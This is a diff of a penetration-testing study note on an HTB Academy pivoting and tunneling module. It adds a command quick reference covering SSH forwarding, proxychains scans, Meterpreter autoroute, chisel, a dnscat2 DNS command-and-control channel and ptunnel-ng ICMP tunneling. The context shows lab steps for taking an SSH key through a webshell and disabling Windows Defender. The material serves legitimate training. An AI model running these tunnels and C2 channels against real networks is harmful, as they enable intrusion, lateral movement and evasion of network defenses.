@@ -3,17 +3,17 @@
 HTB Academy module: "Pivoting, Tunneling, and Port Forwarding" (Tier 2, Medium, mrb3n / TreyCraf7_1 / LTNB0B). Supplementary content for [[Port Redirection and SSH Tunneling]] (Module 19).
 
 **Already in the vault — NOT duplicated here:**
-- Networking basics (routing tables, eth0/tun0 assignment) — 19.1
-- SSH dynamic port forwarding (`ssh -D 9050`) + proxychains + xfreerdp — [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]]
-- SSH remote/reverse port forwarding (`ssh -R`) — [[Port Redirection and SSH Tunneling#19.3.3 SSH Remote Port Forwarding|19.3.3]]
-- Netsh portproxy — [[Port Redirection and SSH Tunneling#19.4.3 Netsh (Network Shell)|19.4.3]]
-- Socat port forward basics — [[Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]]
+- Networking basics (routing tables, eth0/tun0 assignment). 19.1
+- SSH dynamic port forwarding (`ssh -D 9050`) + proxychains + xfreerdp, [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]]
+- SSH remote/reverse port forwarding (`ssh -R`), [[Port Redirection and SSH Tunneling#19.3.3 SSH Remote Port Forwarding|19.3.3]]
+- Netsh portproxy, [[Port Redirection and SSH Tunneling#19.4.3 Netsh (Network Shell)|19.4.3]]
+- Socat port forward basics, [[Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]]
 
 ---
 
 ## PT.1 Meterpreter Tunneling & Port Forwarding
 
-When you land a Meterpreter session on a Linux pivot host you can build a full SOCKS proxy without touching SSH at all — Metasploit handles routing and the proxy server internally.
+When you land a Meterpreter session on a Linux pivot host you can build a full SOCKS proxy without touching SSH at all. Metasploit handles routing and the proxy server internally.
 
 **Full workflow:**
 
@@ -73,13 +73,13 @@ for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
 
 > 🔍 Worth remembering: `run autoroute -s` takes CIDR or netmask notation. The /23 for 172.16.5.0/23 covers both 172.16.4.x and 172.16.5.x. Use `run autoroute -p` to list what's currently routed.
 
-> 🔁 Similar to: [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]] (SSH -D 9050) for the SOCKS part; [[Port Redirection and SSH Tunneling#19.3.5 Using sshuttle|19.3.5]] for the transparent routing part — this is the MSF equivalent.
+> 🔁 Similar to: [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]] (SSH -D 9050) for the SOCKS part; [[Port Redirection and SSH Tunneling#19.3.5 Using sshuttle|19.3.5]] for the transparent routing part, this is the MSF equivalent.
 
 ---
 
 ## PT.2 Socat with a Meterpreter Bind Shell
 
-When the internal Windows target can't call back to Kali (egress filtered), use a **bind_tcp** payload — the target listens, you connect in. Socat on the pivot host forwards your connection.
+When the internal Windows target can't call back to Kali (egress filtered), use a **bind_tcp** payload, the target listens, you connect in. Socat on the pivot host forwards your connection.
 
 ```bash
 # 1. Generate a Windows bind Meterpreter payload
@@ -101,7 +101,7 @@ set RHOST <pivot-host-ip>   # required for bind_tcp — connect TO this host
 run
 ```
 
-Key difference from reverse shells: `RHOST` is set (you're connecting out to the target's listener), not `LHOST`. The SSH tunneling is not required — socat alone handles the relay.
+Key difference from reverse shells: `RHOST` is set (you're connecting out to the target's listener), not `LHOST`. The SSH tunneling is not required, socat alone handles the relay.
 
 > 🔁 Similar to: [[Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]] (same socat command). The new piece here is the MSF bind_tcp payload type and the `RHOST` handler pattern.
 
@@ -148,7 +148,7 @@ python2.7 client.py --server-ip <kali-ip> --server-port 9999 \
 
 **Dnscat2** hides C2 traffic inside DNS queries. Every command/response is encoded into DNS request/response packets. Useful when a firewall only allows DNS outbound traffic (port 53 UDP).
 
-**Architecture:** attack host runs the Ruby server (`dnscat2.rb`) as a fake DNS authority for a domain. The compromised Windows host runs a PowerShell client that makes DNS queries for subdomains of that domain — the content of those subdomains IS the C2 channel.
+**Architecture:** attack host runs the Ruby server (`dnscat2.rb`) as a fake DNS authority for a domain. The compromised Windows host runs a PowerShell client that makes DNS queries for subdomains of that domain, the content of those subdomains IS the C2 channel.
 
 ```bash
 # On Kali — install dependencies and start the server
@@ -276,7 +276,7 @@ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 
 Then use proxychains as normal (SOCKS4, port 9050).
 
-> 🔍 Worth remembering: ptunnel-ng requires root on both sides (raw ICMP socket access). The tunnel is ICMP-encapsulated TCP — the SSH session inside is still encrypted, but the outer ICMP packets are plaintext at the ICMP layer (though the content is the encrypted SSH stream). IDS with ICMP deep inspection may catch unusual ICMP payload sizes.
+> 🔍 Worth remembering: ptunnel-ng requires root on both sides (raw ICMP socket access). The tunnel is ICMP-encapsulated TCP, the SSH session inside is still encrypted, but the outer ICMP packets are plaintext at the ICMP layer (though the content is the encrypted SSH stream). IDS with ICMP deep inspection may catch unusual ICMP payload sizes.
 
 > 📸 Screenshot: ptunnel-ng server running on pivot, client creating tunnel, ssh -p2222 session established
 
@@ -332,7 +332,7 @@ Uninstall-WindowsFeature -Name Windows-Defender
 **Final hop — open mstsc.exe from the pivot host and connect to the final target:**
 - Proxifier intercepts mstsc.exe's traffic and routes it through the SOCKS channel via the inner host
 
-> 🔍 Worth remembering: this chain runs entirely inside Windows RDP sessions — no new inbound ports, no Kali TCP reach into the inner network. AV must be disabled on both Windows hosts or the DLL/EXE get deleted on transfer.
+> 🔍 Worth remembering: this chain runs entirely inside Windows RDP sessions, no new inbound ports, no Kali TCP reach into the inner network. AV must be disabled on both Windows hosts or the DLL/EXE get deleted on transfer.
 
 > 📸 Screenshot: regsvr32 success dialog, mstsc.exe with SocksOverRDP negotiation in log, Proxifier showing active rule, final RDP session on target
 
@@ -340,7 +340,7 @@ Uninstall-WindowsFeature -Name Windows-Defender
 
 ## PT.8 Skills Assessment Chain
 
-**Environment:** 3-hop network traversal — webshell on exposed web server → Ubuntu pivot (172.16.5.15/16) → Windows server (172.16.5.35) → Windows workstation (172.16.6.25) → DC network share.
+**Environment:** 3-hop network traversal, webshell on exposed web server → Ubuntu pivot (172.16.5.15/16) → Windows server (172.16.5.35) → Windows workstation (172.16.6.25) → DC network share.
 
 ### Step 1: Webshell → SSH access as webadmin
 
@@ -354,7 +354,7 @@ cat id_rsa
 # SSH private key for webadmin
 ```
 
-On Kali — save the key, fix permissions, connect:
+On Kali, save the key, fix permissions, connect:
 ```bash
 chmod 600 id_rsa
 ssh -i id_rsa webadmin@<target-ip>
@@ -409,7 +409,7 @@ Flag at `C:\Flag.txt` → `N3tw0rk-H0pp1ng-f0R-FuN`
 
 On the 172.16.6.25 workstation: open This PC → `AutomateDCAdmin (Z:)` network share is already mounted → navigate to the share → `Flag.txt` → `3nd-0xf-Th3-R@inbow!`
 
-> 🔍 Worth remembering: domain workstations that have mapped drives to the DC (via startup scripts, GPO, or manual admin mapping) give you free access to DC resources without needing to compromise the DC itself — as long as your user has permission on the share.
+> 🔍 Worth remembering: domain workstations that have mapped drives to the DC (via startup scripts, GPO, or manual admin mapping) give you free access to DC resources without needing to compromise the DC itself, as long as your user has permission on the share.
 
 ---
 
@@ -469,8 +469,131 @@ On the 172.16.6.25 workstation: open This PC → `AutomateDCAdmin (Z:)` network 
 
 ---
 
-🔁 [[Port Redirection and SSH Tunneling]] (Module 19 — the Offsec version covering Socat/SSH/sshuttle/Plink/Netsh)
-🔁 [[Chisel]] (Modern Tooling — reverse variant and general reference)
-🔁 [[Ligolo-ng]] (Modern Tooling — TUN-based pivoting, no proxychains needed)
+🔁 [[Port Redirection and SSH Tunneling]] (Module 19, the Offsec version covering Socat/SSH/sshuttle/Plink/Netsh)
+🔁 [[Chisel]] (Modern Tooling, reverse variant and general reference)
+🔁 [[Ligolo-ng]] (Modern Tooling. TUN-based pivoting, no proxychains needed)
 
 #### Tags: #Pivoting #Tunneling #Meterpreter #autoroute #socks_proxy #Rpivot #Dnscat2 #Chisel #ICMP #ptunnel-ng #SocksOverRDP #Proxifier #SkillsAssessment #HTBSupplementary
+
+
+---
+
+## HTB Module Quick Reference
+
+Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.
+
+```bash
+# ============================================================
+# NETWORK RECON FROM PIVOT HOST
+# ============================================================
+ifconfig              # Linux: interfaces and routes on the pivot
+ipconfig /all         # Windows equivalent
+netstat -r            # routing table (reveals other subnets)
+# Ping sweep from Linux pivot:
+for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
+# Ping sweep from Windows:
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+
+# ============================================================
+# SSH PORT FORWARDING
+# ============================================================
+# Local forward — access pivot's internal service from Kali
+ssh -L $Port:localhost:3306 $Username@$BoxIP
+# Then connect: mysql -u root -h 127.0.0.1 -P $Port
+
+# Dynamic forward — SOCKS proxy for proxychains
+ssh -D 9050 $Username@$BoxIP
+# Then use: proxychains <any tool>
+
+# Remote forward — punch back through a restricted pivot
+ssh -R 8080:0.0.0.0:$Port $Username@$BoxIP -vN
+# Listens on pivot:8080, forwards to Kali:$Port
+
+# Multiple local forwards in one connection
+ssh -L 1234:localhost:3306 -L 8080:localhost:80 $Username@$BoxIP
+
+# ============================================================
+# PROXYCHAINS
+# ============================================================
+# /etc/proxychains.conf — add at the bottom:
+# socks4 127.0.0.1 9050
+
+# Nmap through proxychains (must use -sT -Pn -n — no SYN scan)
+proxychains nmap -v -Pn -sT 172.16.5.19 -p 445,80,443
+
+# Ping sweep through proxychains
+proxychains nmap -v -sn 172.16.5.1-200
+
+# RDP through proxychains
+proxychains xfreerdp /v:172.16.5.25 /u:$Username /p:$Password
+
+# ============================================================
+# SSHUTTLE (transparent routing — no proxychains needed)
+# ============================================================
+sudo sshuttle -r $Username@$BoxIP 172.16.5.0/24 -v
+# All traffic to 172.16.5.0/24 now routes through the pivot automatically
+
+# ============================================================
+# METERPRETER / MSF PIVOTING
+# ============================================================
+# In meterpreter session:
+run post/multi/manage/autoroute   # add target subnet to MSF routing table
+# Then from MSF:
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 4a
+run -j
+# Now proxychains routes through MSF
+
+# MSF ping sweep:
+msf6 > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+
+# Meterpreter portfwd (direct TCP forward without proxychains):
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.25
+# Then: xfreerdp /v:localhost:3300 /u:$Username /p:$Password
+
+# ============================================================
+# SOCAT (no SSH available)
+# ============================================================
+# On Linux pivot: relay port 8080 → target:8443
+socat TCP4-LISTEN:8080,fork TCP4:$BoxIP:8443
+
+# ============================================================
+# PLINK (Windows pivot — SSH not available)
+# ============================================================
+plink -D 9050 $Username@$LocalIP   # dynamic forward back to Kali
+
+# ============================================================
+# WINDOWS NETSH PORTPROXY
+# ============================================================
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
+netsh.exe interface portproxy show v4tov4   # verify rule
+netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.42.198   # cleanup
+
+# ============================================================
+# CHISEL (HTTP/HTTPS tunnel — works through web proxies)
+# ============================================================
+# On Kali (server):
+./chisel server -v -p 1234 --socks5
+# On pivot (client):
+./chisel client -v $LocalIP:1234 socks
+# Then proxychains with socks5 127.0.0.1 1080
+
+# ============================================================
+# DNSCAT2 (DNS tunnel — egress on port 53 only)
+# ============================================================
+# On Kali:
+sudo ruby dnscat2.rb --dns host=$LocalIP,port=53,domain=inlanefreight.local --no-cache
+# On Windows pivot (PowerShell):
+Import-Module dnscat2.ps1
+Start-Dnscat2 -DNSserver $LocalIP -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd
+
+# ============================================================
+# PTUNNEL-NG (ICMP tunnel — only ICMP egress allowed)
+# ============================================================
+# On Kali (server):
+sudo ./ptunnel-ng -r$BoxIP -R22
+# On pivot (client):
+sudo ./ptunnel-ng -p$BoxIP -l2222 -r$BoxIP -R22
+ssh -p2222 -l$Username 127.0.0.1   # SSH through the ICMP tunnel
+```
